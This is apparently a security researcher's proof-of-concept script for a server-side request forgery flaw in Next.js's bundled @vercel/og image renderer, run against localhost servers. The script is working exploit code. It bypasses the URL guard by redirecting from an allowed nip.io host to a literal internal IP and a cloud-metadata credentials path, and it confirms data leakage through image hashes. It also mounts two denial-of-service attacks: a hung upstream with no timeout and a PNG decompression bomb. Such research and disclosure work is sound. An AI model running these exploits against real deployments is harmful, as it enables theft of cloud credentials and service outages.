// Executed escalation tests for the next/og SSRF (H7), against the SHIPPED
// @vercel/og bundle (resvg-wasm backend, the default). Localhost-only.
//
//   A) REDIRECT guard bypass reaching a LITERAL blocked IP. The guard vets the
//      initial URL once; fetch() follows redirects with no re-check, so a
//      guard-ALLOWED host that 302s to a literal private/metadata IP is reached.
//      More robust than the DNS-name trick (no attacker DNS; hits literal IMDS).
//   B) Unauthenticated DoS: (b1) no fetch timeout -> a slow/hung upstream hangs
//      the render forever; (b2) tiny-file -> huge-decode amplification.
import http from 'node:http'
import zlib from 'node:zlib'
import crypto from 'node:crypto'

import { fileURLToPath } from 'node:url'
const OG = fileURLToPath(new URL('../packages/next/src/compiled/@vercel/og/index.node.js', import.meta.url))
const { ImageResponse } = await import(OG)

const sha = (b) => crypto.createHash('sha256').update(Buffer.from(b)).digest('hex').slice(0, 16)
const listen = (srv) => new Promise((r) => srv.listen(0, '127.0.0.1', () => r(srv.address().port)))
const withTimeout = (p, ms) => Promise.race([
  p.then((v) => ({ done: true, v })),
  new Promise((r) => setTimeout(() => r({ done: false }), ms)),
])

// render an <img src> through the real ImageResponse; return a result record
async function renderImg(src, capMs = 20000) {
  const element = {
    type: 'div',
    props: { style: { display: 'flex', width: '100%', height: '100%' },
      children: { type: 'img', props: { src, width: 180, height: 180 } } },
  }
  const t0 = process.hrtime.bigint()
  const rssBefore = process.memoryUsage().rss
  try {
    const r = new ImageResponse(element, { width: 200, height: 200 })
    const race = await withTimeout(r.arrayBuffer(), capMs)
    const ms = Number(process.hrtime.bigint() - t0) / 1e6
    const rssDelta = (process.memoryUsage().rss - rssBefore) / 1e6
    if (!race.done) return { status: 'PENDING', ms, note: `still not resolved after ${capMs}ms` }
    const buf = Buffer.from(race.v)
    return { status: 'ok', ms, bytes: buf.length, hash: sha(buf), rssDeltaMB: +rssDelta.toFixed(0) }
  } catch (e) {
    const ms = Number(process.hrtime.bigint() - t0) / 1e6
    return { status: 'threw', ms, error: String(e.message || e).split('\n')[0].slice(0, 90) }
  }
}

// ---------- minimal PNG helpers ----------
const CRC = (() => { const t = new Int32Array(256); for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; t[n] = c } return (b) => { let c = ~0; for (let i = 0; i < b.length; i++) c = t[(c ^ b[i]) & 0xff] ^ (c >>> 8); return ~c >>> 0 } })()
const pngChunk = (type, data) => { const len = Buffer.alloc(4); len.writeUInt32BE(data.length, 0); const td = Buffer.concat([Buffer.from(type, 'ascii'), data]); const crc = Buffer.alloc(4); crc.writeUInt32BE(CRC(td), 0); return Buffer.concat([len, td, crc]) }
function solidPng(w, h, [r, g, b]) {
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2
  const px = Buffer.from([r, g, b]); const row = Buffer.concat([Buffer.from([0]), ...Array.from({ length: w }, () => px)])
  const raw = Buffer.concat(Array.from({ length: h }, () => row))
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), pngChunk('IHDR', ihdr), pngChunk('IDAT', zlib.deflateSync(raw)), pngChunk('IEND', Buffer.alloc(0))])
}
// A tiny PNG file that DECLARES large dimensions but whose IDAT is a stream of
// zero-rows (built incrementally so THIS process stays small). Decodes to
// w*h*4 bytes in the rasterizer: classic decode amplification.
function bombPng(w, h) {
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = 8; ihdr[9] = 2
  const def = zlib.createDeflateRaw ? zlib.createDeflate() : zlib.createDeflate()
  const chunks = []; def.on('data', (d) => chunks.push(d))
  const zeroRow = Buffer.alloc(1 + w * 3, 0) // filter byte 0 + w RGB pixels, all zero
  const done = new Promise((res) => def.on('end', res))
  for (let y = 0; y < h; y++) def.write(zeroRow)
  def.end()
  return done.then(() => {
    const idat = Buffer.concat(chunks)
    return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), pngChunk('IHDR', ihdr), pngChunk('IDAT', idat), pngChunk('IEND', Buffer.alloc(0))])
  })
}

// ---------- servers ----------
let internalHits = []
let internalColor = [220, 20, 20]
const internal = http.createServer((req, res) => { internalHits.push(req.url); res.setHeader('content-type', 'image/png'); res.end(solidPng(120, 120, internalColor)) })
const iPort = await listen(internal)

// redirector on a guard-ALLOWED host (127.0.0.1.nip.io) -> 302 to literal IP
const redir = http.createServer((req, res) => { res.statusCode = 302; res.setHeader('location', `http://127.0.0.1:${iPort}/latest/meta-data/iam/security-credentials/admin`); res.end() })
const rPort = await listen(redir)

// sink that sends headers then never finishes the body (slow-loris)
const sockets = new Set()
const sink = http.createServer((req, res) => { res.writeHead(200, { 'content-type': 'image/png', 'content-length': '1000000' }); res.write(Buffer.from([137, 80, 78, 71])) /* never end */ })
sink.on('connection', (s) => { sockets.add(s); s.on('close', () => sockets.delete(s)) })
const sPort = await listen(sink)

// serve a bomb PNG
let bombBytes
const bombSrv = http.createServer((req, res) => { res.setHeader('content-type', 'image/png'); res.end(bombBytes) })
const bPort = await listen(bombSrv)

const nip = (port, path = '/') => `http://127.0.0.1.nip.io:${port}${path}`
console.log(`internal(literal-only) :${iPort}  redirector(allowed host) :${rPort}  sink :${sPort}  bomb :${bPort}\n`)

// ================= A) REDIRECT BYPASS TO LITERAL IP =================
console.log('=== A) redirect bypass: guard-allowed host 302 -> LITERAL blocked IP ===')
internalHits = []; internalColor = [220, 20, 20]
const redRes = await renderImg(nip(rPort, '/go'))                       // -> 302 -> http://127.0.0.1:iPort/...
console.log('  render(<img src=allowed-host-that-302s-to-literal-IP>):', redRes)
const reachedViaRedirect = internalHits.length > 0
console.log('  internal service reached via the redirect target       :', reachedViaRedirect, internalHits)

console.log('  -- content-exfil A/B over the redirect --')
internalHits = []; internalColor = [20, 20, 220]
const blueRes = await renderImg(nip(rPort, '/go'))
console.log('  render again w/ internal secret = BLUE                 :', { status: blueRes.status, hash: blueRes.hash })

console.log('  -- control: give the LITERAL IP directly (guard must block) --')
internalHits = []
const ctrl = await renderImg(`http://127.0.0.1:${iPort}/latest/meta-data/`)
console.log('  render(<img src=http://127.0.0.1:PORT/...>) directly    :', { status: ctrl.status, error: ctrl.error })
const literalBlocked = ctrl.status === 'threw' && internalHits.length === 0

// ================= B1) DoS: NO FETCH TIMEOUT (hang) =================
console.log('\n=== B1) DoS: no fetch timeout — a hung upstream hangs the render ===')
internalHits = []
const normal = await renderImg(nip(iPort, '/ok.png'), 20000)
console.log('  baseline render of a normal loopback image             :', { status: normal.status, ms: normal.ms?.toFixed(0) })
const hung = await renderImg(nip(sPort, '/hang'), 6000)  // observe only 6s
console.log('  render of an <img> whose upstream never finishes (6s cap):', hung)

// ================= B2) DoS: decode amplification (bomb) =================
console.log('\n=== B2) DoS: tiny file -> huge decode (amplification) ===')
const W = 4000, H = 4000
bombBytes = await bombPng(W, H)
console.log(`  bomb PNG: declares ${W}x${H}, file is ${(bombBytes.length / 1024).toFixed(1)} KB, decodes to ${(W * H * 4 / 1e6).toFixed(0)} MB (RGBA)`)
const bomb = await renderImg(nip(bPort, '/bomb.png'), 30000)
console.log('  render(<img src=bomb.png>)                             :', bomb)
console.log(`  amplification: ${(bombBytes.length)} bytes in  ->  ~${(W * H * 4 / 1e6).toFixed(0)} MB decoded${bomb.rssDeltaMB != null ? `  (observed RSS delta ~${bomb.rssDeltaMB} MB)` : ''}`)

// ================= VERDICT =================
console.log('\n================ VERDICT ================')
console.log('A. Redirect bypass reaches a LITERAL blocked IP        :', reachedViaRedirect && literalBlocked ? 'YES — allowed host 302 -> literal IP is followed; the same literal IP is refused when given directly' : 'inconclusive')
console.log('   internal CONTENT exfiltrated over the redirect      :', redRes.status === 'ok' && blueRes.status === 'ok' && redRes.hash !== blueRes.hash ? 'YES (RED vs BLUE differ)' : 'no')
console.log('B1. No fetch timeout (hung upstream hangs the render)  :', hung.status === 'PENDING' ? `YES — still unresolved after 6s (normal render was ${normal.ms?.toFixed(0)}ms)` : `no (${hung.status})`)
console.log('B2. Tiny-file -> huge-decode amplification             :', (bomb.status === 'ok' || bomb.status === 'threw') ? `${bomb.status === 'threw' ? 'render aborted (DoS)' : 'rendered'} — ${bombBytes.length}B file forced a ~${(W * H * 4 / 1e6).toFixed(0)}MB decode` : 'inconclusive')
console.log('=========================================')

for (const s of sockets) s.destroy()
internal.close(); redir.close(); sink.close(); bombSrv.close()
process.exit(0)
